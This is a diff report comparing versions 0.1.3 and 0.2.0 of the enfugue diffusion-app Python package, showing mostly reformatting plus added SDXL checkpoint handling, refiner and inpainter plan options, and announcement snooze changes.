         self.lock = Lock()
         self.uuid = get_uuid()
         self.engine = engine
@@ -73,20 +73,22 @@
         Tries to communicate with the engine to see what's going on.
         """
         if self.id is None:
             raise IOError("Invocation not started yet.")
         if self.results is not None:
             raise IOError("Invocation already completed.")
         try:
+            start_comm = datetime.datetime.now()
             last_intermediate = self.engine.last_intermediate(self.id)
             if last_intermediate is not None:
                 for key in ["step", "total", "images", "rate"]:
                     if key in last_intermediate:
                         setattr(self, f"last_{key}", last_intermediate[key])
                 self.last_intermediate_time = datetime.datetime.now()
+            end_comm = (datetime.datetime.now() - start_comm).total_seconds()
             try:
                 result = self.engine.wait(self.id, timeout=0.1)
             except TimeoutError:
                 raise
             except Exception as ex:
                 result = None
                 self.error = ex
@@ -107,14 +109,18 @@
                             self.results.append("unsaved")
                 elif "error" in result:
                     error_type = resolve(result["error"])
                     self.error = error_type(result["message"])
                     if "traceback" in result:
                         logger.error(f"Traceback for invocation {self.uuid}:")
                         logger.debug(result["traceback"])
+                if self.metadata is not None and "tensorrt_build" in self.metadata:
+                    logger.info("TensorRT build complete, terminating engine to start fresh on next invocation.")
+                    self.engine.terminate_process()
+
         except TimeoutError:
             return
 
     def _check_raise_error(self) -> None:
         """
         Raises an error if one has been set.
         """
@@ -150,17 +156,15 @@
             return False
         if self.communication_timeout is None:
             return False
         if self.last_intermediate_time is not None:
             last_known_time = self.last_intermediate_time
         else:
             last_known_time = self.start_time
-        seconds_since_last_communication = (
-            datetime.datetime.now() - last_known_time
-        ).total_seconds()
+        seconds_since_last_communication = (datetime.datetime.now() - last_known_time).total_seconds()
         return seconds_since_last_communication > self.communication_timeout
 
     def timeout(self) -> None:
         """
         Times out an invocation that got lost
         """
         self.error = TimeoutError("Invocation timed out.")
```

### Comparing `enfugue-0.1.3/enfugue/api/manager.py` & `enfugue-0.2.0/enfugue/api/manager.py`

 * *Files 12% similar despite different names*

```diff
@@ -11,16 +11,21 @@
 from pibble.api.exceptions import TooManyRequestsError, BadRequestError
 from pibble.util.numeric import human_size
 
 from enfugue.api.downloads import Download
 from enfugue.api.invocations import Invocation
 from enfugue.diffusion.engine import DiffusionEngine
 from enfugue.diffusion.plan import DiffusionPlan
-from enfugue.diffusion.constants import DEFAULT_MODEL, DEFAULT_INPAINTING_MODEL
-from enfugue.util import logger, check_make_directory
+from enfugue.util import logger, check_make_directory, find_file_in_directory
+from enfugue.diffusion.constants import (
+    DEFAULT_MODEL,
+    DEFAULT_INPAINTING_MODEL,
+    DEFAULT_SDXL_MODEL,
+    DEFAULT_SDXL_REFINER
+)
 
 __all__ = ["SystemManagerThread", "SystemManager"]
 
 
 class SystemManagerThread(Thread):
     """
     This thread simply executes periodic tasks on the manager.
@@ -149,74 +154,108 @@
         return directory
 
     @property
     def engine_tensorrt_dir(self) -> str:
         """
         Gets the location for tensorrt engines.
         """
-        directory = self.configuration.get(
-            "enfugue.engine.tensorrt", os.path.join(self.engine_root_dir, "tensorrt")
-        )
+        directory = self.configuration.get("enfugue.engine.tensorrt", os.path.join(self.engine_root_dir, "tensorrt"))
         check_make_directory(directory)
         return directory
 
     @property
     def engine_checkpoint_dir(self) -> str:
         """
         Returns the engine checkpoint location.
         """
-        path = self.configuration.get(
-            "enfugue.engine.checkpoint", os.path.join(self.engine_root_dir, "checkpoint")
-        )
+        path = self.configuration.get("enfugue.engine.checkpoint", os.path.join(self.engine_root_dir, "checkpoint"))
         check_make_directory(path)
         return path
 
     @property
     def default_model_ckpt(self) -> str:
         """
         Returns the location where the default model should be.
         """
         default_model_ckpt = os.path.basename(DEFAULT_MODEL)
-        return os.path.join(self.engine_checkpoint_dir, default_model_ckpt)
+        found = find_file_in_directory(self.engine_checkpoint_dir, default_model_ckpt)
+        return found if found else os.path.join(self.engine_checkpoint_dir, default_model_ckpt)
 
     @property
     def default_inpaint_ckpt(self) -> str:
         """
         Returns the location where the default inpaint model should be.
         """
         default_inpaint_ckpt = os.path.basename(DEFAULT_INPAINTING_MODEL)
-        return os.path.join(self.engine_checkpoint_dir, default_inpaint_ckpt)
+        found = find_file_in_directory(self.engine_checkpoint_dir, default_inpaint_ckpt)
+        return found if found else os.path.join(self.engine_checkpoint_dir, default_inpaint_ckpt)
+
+    @property
+    def default_sdxl_ckpt(self) -> str:
+        """
+        Returns the location where the default sdxl checkpoint should be.
+        """
+        default_sdxl_ckpt = os.path.basename(DEFAULT_SDXL_MODEL)
+        found = find_file_in_directory(self.engine_checkpoint_dir, default_sdxl_ckpt)
+        return found if found else os.path.join(self.engine_checkpoint_dir, default_sdxl_ckpt)
+
+    @property
+    def default_sdxl_refiner_ckpt(self) -> str:
+        """
+        Returns the location where the default sdxl_refiner model should be.
+        """
+        default_sdxl_refiner_ckpt = os.path.basename(DEFAULT_SDXL_REFINER)
+        found = find_file_in_directory(self.engine_checkpoint_dir, default_sdxl_refiner_ckpt)
+        return found if found else os.path.join(self.engine_checkpoint_dir, default_sdxl_refiner_ckpt)
 
     @property
     def pending_default_downloads(self) -> List[Tuple[str, str]]:
         """
         Gets default downloads that need to be started.
         """
-        default_model_ckpt, default_inpaint_ckpt = (
+        (
+            default_model_ckpt,
+            default_inpaint_ckpt,
+        ) = (
             self.default_model_ckpt,
             self.default_inpaint_ckpt,
         )
         pending = []
         if not os.path.exists(default_model_ckpt) and not self.is_downloading(DEFAULT_MODEL):
             pending.append((DEFAULT_MODEL, default_model_ckpt))
-        if not os.path.exists(default_inpaint_ckpt) and not self.is_downloading(
-            DEFAULT_INPAINTING_MODEL
-        ):
+        if not os.path.exists(default_inpaint_ckpt) and not self.is_downloading(DEFAULT_INPAINTING_MODEL):
             pending.append((DEFAULT_INPAINTING_MODEL, default_inpaint_ckpt))
         return pending
 
     @property
+    def pending_xl_downloads(self) -> List[Tuple[str, str]]:
+        """
+        Gets XL downloads that can be started.
+        """
+        (
+            default_sdxl_ckpt,
+            default_sdxl_refiner_ckpt
+        ) = (
+            self.default_sdxl_ckpt,
+            self.default_sdxl_refiner_ckpt
+        )
+        pending = []
+        if not os.path.exists(default_sdxl_ckpt) and not self.is_downloading(DEFAULT_SDXL_MODEL):
+            pending.append((DEFAULT_SDXL_MODEL, default_sdxl_ckpt))
+        if not os.path.exists(default_sdxl_refiner_ckpt) and not self.is_downloading(DEFAULT_SDXL_REFINER):
+            pending.append((DEFAULT_SDXL_REFINER, default_sdxl_refiner_ckpt))
+        return pending
+
+    @property
     def active_default_downloads(self) -> List[Download]:
         """
         Gets default downloads that are currently underway.
         """
         return [
-            download
-            for download in self.active_downloads
-            if download.src in [DEFAULT_MODEL, DEFAULT_INPAINTING_MODEL]
+            download for download in self.active_downloads if download.src in [DEFAULT_MODEL, DEFAULT_INPAINTING_MODEL]
         ]
 
     @property
     def is_downloading_defaults(self) -> bool:
         """
         Returns true if there is an active download of a default model.
         We queue invocations until these are done, otherwise we might spawn
@@ -232,17 +271,15 @@
         return self.configuration.get("enfugue.downloads.queue", self.DEFAULT_MAX_QUEUED_DOWNLOADS)
 
     @property
     def max_concurrent_downloads(self) -> int:
         """
         The maximum number of downloads that can go at once.
         """
-        return self.configuration.get(
-            "enfugue.downloads.concurrent", self.DEFAULT_MAX_CONCURRENT_DOWNLOADS
-        )
+        return self.configuration.get("enfugue.downloads.concurrent", self.DEFAULT_MAX_CONCURRENT_DOWNLOADS)
 
     @property
     def max_queued_invocations(self) -> int:
         """
         The maximum number of invocations that can be queued.
         """
         return self.configuration.get("enfugue.queue", self.DEFAULT_MAX_QUEUED_INVOCATIONS)
@@ -264,18 +301,15 @@
 
     @property
     def active_downloads(self) -> List[Download]:
         """
         Gets a list of active downloads
         """
         return [
-            download
-            for download_list in self.downloads.values()
-            for download in download_list
-            if not download.complete
+            download for download_list in self.downloads.values() for download in download_list if not download.complete
         ]
 
     @property
     def remaining_concurrent_downloads(self) -> int:
         """
         Gets the remaining number of download slots.
         """
@@ -328,17 +362,15 @@
                 "active": len(self.active_downloads),
                 "queued": len(self.download_queue),
                 "total": sum([len(download_list) for download_list in self.downloads.values()]),
             },
             "invocations": {
                 "active": not self.can_invoke,
                 "queued": len(self.invocation_queue),
-                "total": sum(
-                    [len(invocation_list) for invocation_list in self.invocations.values()]
-                ),
+                "total": sum([len(invocation_list) for invocation_list in self.invocations.values()]),
             },
         }
 
     def is_downloading(self, url: str) -> bool:
         """
         Returns true if there is already an active download process for a URL.
         """
@@ -475,22 +507,17 @@
                             if file_name == "model.opt.onnx":
                                 if "engine.plan" in stage_files:
                                     to_remove.append(file_path)
                             elif file_name == "model.onnx":
                                 if "model.opt.onnx" in stage_files:
                                     to_remove.append(file_path)
                             elif file_name == "timing_cache":
-                                file_mod_time = datetime.datetime.fromtimestamp(
-                                    os.path.getmtime(file_path)
-                                )
+                                file_mod_time = datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
                                 file_age = (datetime.datetime.now() - file_mod_time).total_seconds()
-                                if (
-                                    file_age > self.max_timing_cache_age
-                                    or "engine.plan" in stage_files
-                                ):
+                                if file_age > self.max_timing_cache_age or "engine.plan" in stage_files:
                                     to_remove.append(file_path)
                             elif file_name != "engine.plan" and file_name != "metadata.json":
                                 to_remove.append(file_path)
 
                         for file_path in to_remove:
                             logger.info(f"Removing unneeded engine file {file_path}")
                             reclaimed_bytes += os.path.getsize(file_path)
@@ -518,23 +545,19 @@
             self.clean_models()
 
             if self.active_invocation is not None:
                 if self.active_invocation.is_dangling:
                     logger.info("Active invocation appears to be dangling, terminating it.")
                     self.active_invocation.timeout()
                     time.sleep(5)
-                elif (
-                    self.active_invocation.results is None and self.active_invocation.error is None
-                ):
+                elif self.active_invocation.results is None and self.active_invocation.error is None:
                     try:
                         self.active_invocation.poll()
                     except IOError:
-                        self.active_invocation = (
-                            None  # results came in between checking and polling
-                        )
+                        self.active_invocation = None  # results came in between checking and polling
                 else:
                     self.active_invocation = None
 
             if self.active_invocation is None and not self.is_downloading_defaults:
                 try:
                     self.active_invocation = self.invocation_queue.pop(0)
                     self.active_invocation.start()
```

### Comparing `enfugue-0.1.3/enfugue/api/server.py` & `enfugue-0.2.0/enfugue/api/server.py`

 * *Files 20% similar despite different names*

```diff
@@ -11,14 +11,15 @@
 
 from pibble.api.exceptions import NotFoundError
 from pibble.api.server.webservice.template import TemplateServer
 from pibble.api.server.webservice.jsonapi import JSONWebServiceAPIServer
 from pibble.ext.user.server.base import UserExtensionHandlerRegistry
 from pibble.ext.rest.server.user import UserRESTExtensionServerBase
 from pibble.util.encryption import Password
+from pibble.util.helpers import OutputCatcher
 
 from enfugue.diffusion.plan import DiffusionPlan
 
 from enfugue.database import *
 from enfugue.api.controller import *
 from enfugue.interface.helpers import *
 
@@ -104,30 +105,26 @@
     def check_emergency_password_reset(self) -> None:
         """
         Checks if there is an emergency password reset present in the engine directory.
         """
         password_file = os.path.join(self.engine_root, "password_reset.txt")
         if os.path.exists(password_file):
             with self.orm.session() as session:
-                root_user = (
-                    session.query(self.orm.User).filter(self.orm.User.username == "enfugue").one()
-                )
+                root_user = session.query(self.orm.User).filter(self.orm.User.username == "enfugue").one()
                 root_user.password = Password.hash(open(password_file, "r").read())
                 for token in root_user.tokens:
                     session.delete(token)
                 session.commit()
             os.remove(password_file)
 
     def configure(self, **configuration: Any) -> None:
         """
         Override configure() to pass in REST configuration.
         """
-        super(EnfugueAPIServerBase, self).configure(
-            rest=EnfugueAPIRESTConfiguration, **configuration
-        )
+        super(EnfugueAPIServerBase, self).configure(rest=EnfugueAPIRESTConfiguration, **configuration)
 
     def on_destroy(self) -> None:
         """
         Stop the manager thread when the server stops.
         """
         if hasattr(self, "manager"):
             logger.debug("Stopping system manager")
@@ -149,73 +146,137 @@
                     metadata = {"width": width, "height": height, "mode": value.mode}
                     if hasattr(value, "filename"):
                         metadata["filename"] = value.filename
                     serialized[key] = metadata
                 elif isinstance(value, dict):
                     serialized[key] = replace_images(value)
                 elif isinstance(value, list):
-                    serialized[key] = [
-                        replace_images(part) if isinstance(part, dict) else part for part in value
-                    ]
+                    serialized[key] = [replace_images(part) if isinstance(part, dict) else part for part in value]
             return serialized
 
         return replace_images(plan.get_serialization_dict())
 
-    def get_plan_kwargs_from_model(
-        self, model_name: str, include_prompts: bool = True
-    ) -> Dict[str, Any]:
+    def get_plan_kwargs_from_model(self, model_name: str, include_prompts: bool = True) -> Dict[str, Any]:
         """
         Given a model name, return the keyword arguments that should be passed into a plan.
         """
         diffusion_model = (
             self.database.query(self.orm.DiffusionModel)
             .filter(self.orm.DiffusionModel.name == model_name)
             .one_or_none()
         )
         if not diffusion_model:
             raise NotFoundError(f"Unknown diffusion model {model_name}")
 
-        model = os.path.join(
-            self.configuration.get(
-                "enfugue.engine.checkpoint",
-                os.path.join(self.manager.engine_root_dir, "checkpoint"),
-            ),
-            diffusion_model.model,
+        model = os.path.abspath(
+            os.path.join(
+                self.configuration.get(
+                    "enfugue.engine.checkpoint",
+                    os.path.join(self.manager.engine_root_dir, "checkpoint"),
+                ),
+                diffusion_model.model,
+            )
         )
         size = diffusion_model.size
-        lora = [
-            (
+        refiner = diffusion_model.refiner
+        if refiner:
+            refiner_size = refiner[0].size
+            refiner = os.path.abspath(
+                os.path.join(
+                    self.configuration.get(
+                        "enfugue.engine.checkpoint",
+                        os.path.join(self.manager.engine_root_dir, "checkpoint"),
+                    ),
+                    refiner[0].model,
+                ),
+            )
+        else:
+            refiner, refiner_size = None, None
+        inpainter = diffusion_model.inpainter
+        if inpainter:
+            inpainter_size = inpainter[0].size
+            inpainter = os.path.abspath(
                 os.path.join(
                     self.configuration.get(
-                        "enfugue.engine.lora", os.path.join(self.manager.engine_root_dir, "lora")
+                        "enfugue.engine.checkpoint",
+                        os.path.join(self.manager.engine_root_dir, "checkpoint"),
                     ),
-                    lora.model,
+                    inpainter[0].model,
+                ),
+            )
+        else:
+            inpainter, inpainter_size = None, None
+        scheduler, multi_scheduler = None, None
+        if diffusion_model.scheduler:
+            for model_scheduler in diffusion_model.scheduler:
+                if model_scheduler.context == "multi_diffusion":
+                    multi_scheduler = model_scheduler.name
+                else:
+                    scheduler = model_scheduler.name
+        vae = diffusion_model.vae
+        if vae:
+            vae = diffusion_model.vae[0].name
+        else:
+            vae = None
+        lora = [
+            (
+                os.path.abspath(
+                    os.path.join(
+                        self.configuration.get(
+                            "enfugue.engine.lora", os.path.join(self.manager.engine_root_dir, "lora")
+                        ),
+                        lora.model,
+                    )
                 ),
                 float(lora.weight),
             )
             for lora in diffusion_model.lora
         ]
-        inversion = [
-            os.path.join(
-                self.configuration.get(
-                    "enfugue.engine.inversion",
-                    os.path.join(self.manager.engine_root_dir, "inversion"),
+        lycoris = [
+            (
+                os.path.abspath(
+                    os.path.join(
+                        self.configuration.get(
+                            "enfugue.engine.lycoris", os.path.join(self.manager.engine_root_dir, "lycoris")
+                        ),
+                        lycoris.model,
+                    )
                 ),
-                inversion.model,
+                float(lycoris.weight),
+            )
+            for lycoris in diffusion_model.lycoris
+        ]
+        inversion = [
+            os.path.abspath(
+                os.path.join(
+                    self.configuration.get(
+                        "enfugue.engine.inversion",
+                        os.path.join(self.manager.engine_root_dir, "inversion"),
+                    ),
+                    inversion.model,
+                )
             )
             for inversion in diffusion_model.inversion
         ]
         model_prompt = diffusion_model.prompt
         model_negative_prompt = diffusion_model.negative_prompt
 
         plan_kwargs: Dict[str, Any] = {
             "model": model,
+            "refiner": refiner,
+            "refiner_size": refiner_size,
+            "inpainter": inpainter,
+            "inpainter_size": inpainter_size,
             "size": size,
             "lora": lora,
+            "lycoris": lycoris,
             "inversion": inversion,
+            "scheduler": scheduler,
+            "multi_scheduler": multi_scheduler,
+            "vae": vae,
         }
 
         if include_prompts:
             plan_kwargs["model_prompt"] = model_prompt
             plan_kwargs["model_negative_prompt"] = model_negative_prompt
 
         return plan_kwargs
@@ -232,17 +293,15 @@
         Invokes the platform and saves any resulting images, returning their paths.
         """
         invocation = self.manager.invoke(
             user_id, plan, disable_intermediate_decoding=disable_intermediate_decoding, **kwargs
         )
         if save:
             self.database.add(
-                self.orm.DiffusionInvocation(
-                    id=invocation.uuid, user_id=user_id, plan=self.format_plan(plan)
-                )
+                self.orm.DiffusionInvocation(id=invocation.uuid, user_id=user_id, plan=self.format_plan(plan))
             )
             self.database.commit()
         return invocation
 
     def download(
         self,
         user_id: int,
@@ -250,17 +309,15 @@
         destination: str,
         headers: Dict[str, str] = {},
         parameters: Dict[str, Any] = {},
     ) -> Download:
         """
         Starts a download using the download manager.
         """
-        return self.manager.download(
-            user_id, url, destination, headers=headers, parameters=parameters
-        )
+        return self.manager.download(user_id, url, destination, headers=headers, parameters=parameters)
 
     def __del__(self) -> None:
         """
         Add a __del__ in case this gets deleted before on_destroy is called
         """
         self.on_destroy()
 
@@ -286,45 +343,61 @@
     @handlers.secured()
     def announcements(self, request: Request, response: Response) -> List[Dict[str, Any]]:
         """
         Gets any announcements to display to the user.
         """
         announcements = []
 
-        snooze_time = self.user_config.get("enfugue.snooze", None)
+        current_version = get_version()
+        snooze_time = self.user_config.get("enfugue.snooze.time", None)
+        snooze_version = self.user_config.get("enfugue.snooze.version", None)
         snooze_duration = float("inf")
         if snooze_time is not None:
             snooze_duration = (datetime.datetime.now() - snooze_time).total_seconds()
 
-        is_snoozed = snooze_duration < (60 * 60 * 24)
+        is_snoozed = snooze_duration < (60 * 60 * 24 * 30) and snooze_version != current_version
 
         if not is_snoozed:
             is_initialized = self.user_config.get("enfugue.initialized", False)
             if not is_initialized:
                 directories = {}
-                for dirname in ["cache", "checkpoint", "lora", "inversion", "other", "tensorrt"]:
+                for dirname in [
+                    "cache",
+                    "checkpoint",
+                    "diffusers",
+                    "lora",
+                    "lycoris",
+                    "inversion",
+                    "other",
+                    "tensorrt",
+                ]:
                     directories[dirname] = self.configuration.get(
                         f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname)
                     )
 
                 announcements.append({"type": "initialize", "directories": directories})
 
-            pending_downloads = self.manager.pending_default_downloads
-            for url, dest in pending_downloads:
-                model = os.path.basename(url)
-                announcements.append(
-                    {
-                        "type": "download",
-                        "url": url,
-                        "size": requests.head(url, allow_redirects=True).headers["Content-Length"],
-                        "model": model,
-                        "destination": dest,
-                    }
-                )
+            pending_default_downloads = self.manager.pending_default_downloads
+            pending_xl_downloads = self.manager.pending_xl_downloads
 
+            for typename, pending_downloads in [
+                ("download", pending_default_downloads),
+                ("optional-download", pending_xl_downloads)
+            ]:
+                for url, dest in pending_downloads:
+                    model = os.path.basename(url)
+                    announcements.append(
+                        {
+                            "type": typename,
+                            "url": url,
+                            "size": requests.head(url, allow_redirects=True).headers["Content-Length"],
+                            "model": model,
+                            "destination": dest,
+                        }
+                    )
             pending_versions = get_pending_versions()
             for version in pending_versions:
                 announcements.append(
                     {
                         "type": "update",
                         "version": version["version"],
                         "release": version["release"].strftime("%Y-%m-%d"),
@@ -339,25 +412,27 @@
     @handlers.format()
     @handlers.secured()
     def snooze_announcements(self, request: Request, response: Response) -> None:
         """
         Snoozes announcements for a day.
         """
         self.user_config["enfugue.initialized"] = True
-        self.user_config["enfugue.snooze"] = datetime.datetime.now()
+        self.user_config["enfugue.snooze.time"] = datetime.datetime.now()
+        self.user_config["enfugue.snooze.version"] = get_version()
 
     @classmethod
     def serve_icon(cls, configuration: Dict[str, Any]) -> None:
         """
         When working on windows using a .exe, this runs the server using a system tray icon
         """
         import pystray
         from threading import Event
 
         stop_event = Event()
+        catcher = OutputCatcher()
 
         def stop(icon: pystray.Icon) -> None:
             """
             Stops the server.
             """
             icon.visible = False
             stop_event.set()
@@ -378,24 +453,27 @@
             """
             Starts the server.
             """
             icon.visible = True
             server = cls()
             server.configure_start(signal=False, **configuration)
             while not stop_event.is_set():
+                out, err = catcher.output()
+                if out:
+                    logger.debug(f"STDOUT: {out}")
+                if err:
+                    logger.debug(f"STDERR: {err}")
                 stop_event.wait(1)
             server.stop()
             server.destroy()
 
         static_dir = get_local_static_directory()
         icon_path = configuration.get("enfugue", {}).get("icon", "favicon/favicon-64x64.png")
         icon_image = PIL.Image.open(os.path.join(static_dir, "img", icon_path))
         icon = pystray.Icon("enfugue", icon_image)
-        icon.menu = pystray.Menu(
-            pystray.MenuItem("Open App", open_app), pystray.MenuItem("Quit", stop)
-        )
-        icon.run(setup=setup)
-
+        icon.menu = pystray.Menu(pystray.MenuItem("Open App", open_app), pystray.MenuItem("Quit", stop))
+        with catcher:
+            icon.run(setup=setup)
 
 server_parents = tuple([EnfugueAPIServerBase] + list(EnfugueAPIControllerBase.enumerate()))
 
 EnfugueAPIServer = type("EnfugueAPIServer", server_parents, {})
```

### Comparing `enfugue-0.1.3/enfugue/config/cms-context.yml` & `enfugue-0.2.0/enfugue/config/cms-context.yml`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/config/server.yml` & `enfugue-0.2.0/enfugue/config/server.yml`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/database/invocations.py` & `enfugue-0.2.0/enfugue/database/invocations.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/diffusion/edge/mlsd/model.py` & `enfugue-0.2.0/enfugue/diffusion/support/line/mlsd/model.py`

 * *Files 2% similar despite different names*

```diff
@@ -25,20 +25,16 @@
             b = F.interpolate(b, scale_factor=2.0, mode="bilinear", align_corners=True)
         return torch.cat((a, b), dim=1)
 
 
 class BlockTypeB(nn.Module):
     def __init__(self, in_c, out_c):
         super(BlockTypeB, self).__init__()
-        self.conv1 = nn.Sequential(
-            nn.Conv2d(in_c, in_c, kernel_size=3, padding=1), nn.BatchNorm2d(in_c), nn.ReLU()
-        )
-        self.conv2 = nn.Sequential(
-            nn.Conv2d(in_c, out_c, kernel_size=3, padding=1), nn.BatchNorm2d(out_c), nn.ReLU()
-        )
+        self.conv1 = nn.Sequential(nn.Conv2d(in_c, in_c, kernel_size=3, padding=1), nn.BatchNorm2d(in_c), nn.ReLU())
+        self.conv2 = nn.Sequential(nn.Conv2d(in_c, out_c, kernel_size=3, padding=1), nn.BatchNorm2d(out_c), nn.ReLU())
 
     def forward(self, x):
         x = self.conv1(x) + x
         x = self.conv2(x)
         return x
 
 
@@ -46,17 +42,15 @@
     def __init__(self, in_c, out_c):
         super(BlockTypeC, self).__init__()
         self.conv1 = nn.Sequential(
             nn.Conv2d(in_c, in_c, kernel_size=3, padding=5, dilation=5),
             nn.BatchNorm2d(in_c),
             nn.ReLU(),
         )
-        self.conv2 = nn.Sequential(
-            nn.Conv2d(in_c, in_c, kernel_size=3, padding=1), nn.BatchNorm2d(in_c), nn.ReLU()
-        )
+        self.conv2 = nn.Sequential(nn.Conv2d(in_c, in_c, kernel_size=3, padding=1), nn.BatchNorm2d(in_c), nn.ReLU())
         self.conv3 = nn.Conv2d(in_c, out_c, kernel_size=1)
 
     def forward(self, x):
         x = self.conv1(x)
         x = self.conv2(x)
         x = self.conv3(x)
         return x
@@ -91,17 +85,15 @@
         # TFLite uses slightly different padding than PyTorch
         if stride == 2:
             padding = 0
         else:
             padding = (kernel_size - 1) // 2
 
         super(ConvBNReLU, self).__init__(
-            nn.Conv2d(
-                in_planes, out_planes, kernel_size, stride, padding, groups=groups, bias=False
-            ),
+            nn.Conv2d(in_planes, out_planes, kernel_size, stride, padding, groups=groups, bias=False),
             nn.BatchNorm2d(out_planes),
             nn.ReLU6(inplace=True),
         )
         self.max_pool = nn.MaxPool2d(kernel_size=stride, stride=stride)
 
     def forward(self, x):
         # TFLite uses  different padding
@@ -227,17 +219,15 @@
         c1, c2, c3, c4, c5 = fpn_features
         return c1, c2, c3, c4, c5
 
     def forward(self, x):
         return self._forward_impl(x)
 
     def _load_pretrained_model(self):
-        pretrain_dict = model_zoo.load_url(
-            "https://download.pytorch.org/models/mobilenet_v2-b0353104.pth"
-        )
+        pretrain_dict = model_zoo.load_url("https://download.pytorch.org/models/mobilenet_v2-b0353104.pth")
         model_dict = {}
         state_dict = self.state_dict()
         for k, v in pretrain_dict.items():
             if k in state_dict:
                 model_dict[k] = v
         state_dict.update(model_dict)
         self.load_state_dict(state_dict)
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/edge/mlsd/util.py` & `enfugue-0.2.0/enfugue/diffusion/support/line/mlsd/util.py`

 * *Files 2% similar despite different names*

```diff
@@ -88,14 +88,17 @@
             disp_x_start, disp_y_start, disp_x_end, disp_y_end = vmap[y, x, :]
             x_start = x + disp_x_start
             y_start = y + disp_y_start
             x_end = x + disp_x_end
             y_end = y + disp_y_end
             segments_list.append([x_start, y_start, x_end, y_end])
 
+    if not segments_list:
+        return []
+
     lines = 2 * np.array(segments_list)  # 256 > 512
     lines[:, 0] = lines[:, 0] * w_ratio
     lines[:, 1] = lines[:, 1] * h_ratio
     lines[:, 2] = lines[:, 2] * w_ratio
     lines[:, 3] = lines[:, 3] * h_ratio
 
     return lines
@@ -332,17 +335,15 @@
     0 -- 1
     |    |
     3 -- 2
     """
     # rename variables
     deg1_map, deg2_map = deg_inter_to_start, deg_inter_to_end
     # sort deg ascending
-    deg_sort = np.sort(
-        np.concatenate([deg1_map[:, :, None], deg2_map[:, :, None]], axis=-1), axis=-1
-    )
+    deg_sort = np.sort(np.concatenate([deg1_map[:, :, None], deg2_map[:, :, None]], axis=-1), axis=-1)
 
     deg_diff_map = np.abs(deg1_map - deg2_map)
     # we only consider the smallest degree of intersect
     deg_diff_map[deg_diff_map > 180] = 360 - deg_diff_map[deg_diff_map > 180]
 
     # define available degree range
     deg_range = [60, 120]
@@ -446,23 +447,17 @@
                                             ...
                                         segments_list:
                                             order: 0 > 1 > 2 > 3
                                             | line_idx0_i, line_idx0_j, line_idx1_i, line_idx1_j, line_idx2_i, line_idx2_j, line_idx3_i, line_idx3_j |
                                             | line_idx0_i, line_idx0_j, line_idx1_i, line_idx1_j, line_idx2_i, line_idx2_j, line_idx3_i, line_idx3_j |
                                             ...
                                         """
-                                        square_list.append(
-                                            corner0[:2] + corner1[:2] + corner2[:2] + corner3[:2]
-                                        )
-                                        connect_list.append(
-                                            [corner0_line, corner1_line, corner2_line, corner3_line]
-                                        )
-                                        segments_list.append(
-                                            corner0[2:] + corner1[2:] + corner2[2:] + corner3[2:]
-                                        )
+                                        square_list.append(corner0[:2] + corner1[:2] + corner2[:2] + corner3[:2])
+                                        connect_list.append([corner0_line, corner1_line, corner2_line, corner3_line])
+                                        segments_list.append(corner0[2:] + corner1[2:] + corner2[2:] + corner3[2:])
 
     def check_outside_inside(segments_info, connect_idx):
         # return 'outside or inside', min distance, cover_param, peri_param
         if connect_idx == segments_info[0]:
             check_dist_mat = dist_inter_to_segment1
         else:
             check_dist_mat = dist_inter_to_segment2
@@ -495,17 +490,15 @@
         squares_degree = np.arccos(inner_products) * 180 / np.pi  # [n_squares, 4]
 
         # get square score
         overlap_scores = []
         degree_scores = []
         length_scores = []
 
-        for connects, segments, square, degree in zip(
-            connect_array, segments_array, squares, squares_degree
-        ):
+        for connects, segments, square, degree in zip(connect_array, segments_array, squares, squares_degree):
             """
             0 -- 1
             |    |
             3 -- 2
 
             # segments: [4, 2]
             # connects: [4]
@@ -530,33 +523,21 @@
                 # check whether outside or inside
                 (
                     start_position,
                     start_min,
                     start_cover_param,
                     start_peri_param,
                 ) = check_outside_inside(start_segments, connect_idx)
-                end_position, end_min, end_cover_param, end_peri_param = check_outside_inside(
-                    end_segments, connect_idx
-                )
+                end_position, end_min, end_cover_param, end_peri_param = check_outside_inside(end_segments, connect_idx)
 
-                cover += (
-                    dist_segments[connect_idx]
-                    + start_cover_param * start_min
-                    + end_cover_param * end_min
-                )
-                perimeter += (
-                    dist_segments[connect_idx]
-                    + start_peri_param * start_min
-                    + end_peri_param * end_min
-                )
+                cover += dist_segments[connect_idx] + start_cover_param * start_min + end_cover_param * end_min
+                perimeter += dist_segments[connect_idx] + start_peri_param * start_min + end_peri_param * end_min
 
                 square_length.append(
-                    dist_segments[connect_idx]
-                    + start_peri_param * start_min
-                    + end_peri_param * end_min
+                    dist_segments[connect_idx] + start_peri_param * start_min + end_peri_param * end_min
                 )
 
             overlap_scores.append(cover / perimeter)
             ######################################
             ###################################### DEGREE SCORES
             """
             deg0 vs deg2
@@ -592,17 +573,15 @@
         length_scores = np.array(length_scores)
 
         ###################################### AREA SCORES
         area_scores = np.reshape(squares, [-1, 4, 2])
         area_x = area_scores[:, :, 0]
         area_y = area_scores[:, :, 1]
         correction = area_x[:, -1] * area_y[:, 0] - area_y[:, -1] * area_x[:, 0]
-        area_scores = np.sum(area_x[:, :-1] * area_y[:, 1:], axis=-1) - np.sum(
-            area_y[:, :-1] * area_x[:, 1:], axis=-1
-        )
+        area_scores = np.sum(area_x[:, :-1] * area_y[:, 1:], axis=-1) - np.sum(area_y[:, :-1] * area_x[:, 1:], axis=-1)
         area_scores = 0.5 * np.abs(area_scores + correction)
         area_scores /= map_size * map_size  # np.max(area_scores)
         ######################################
 
         ###################################### CENTER SCORES
         centers = np.array([[256 // 2, 256 // 2]], dtype="float32")  # [1, 2]
         # squares: [n, 4, 2]
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/engine.py` & `enfugue-0.2.0/enfugue/diffusion/engine.py`

 * *Files 1% similar despite different names*

```diff
@@ -118,17 +118,15 @@
         """
         if hasattr(self, "process") and self.process.is_alive():
             if fail_when_redundant:
                 raise IOError("spawn_process called while a process is already running")
             return
 
         logger.debug("No current engine process, creating.")
-        self.process = DiffusionEngineProcess(
-            self.instructions, self.results, self.intermediates, self.configuration
-        )
+        self.process = DiffusionEngineProcess(self.instructions, self.results, self.intermediates, self.configuration)
 
         poll_delay_seconds = DiffusionEngineProcess.POLLING_DELAY_MS / 250
 
         try:
             logger.debug("Starting process.")
             self.process.start()
             time.sleep(poll_delay_seconds)
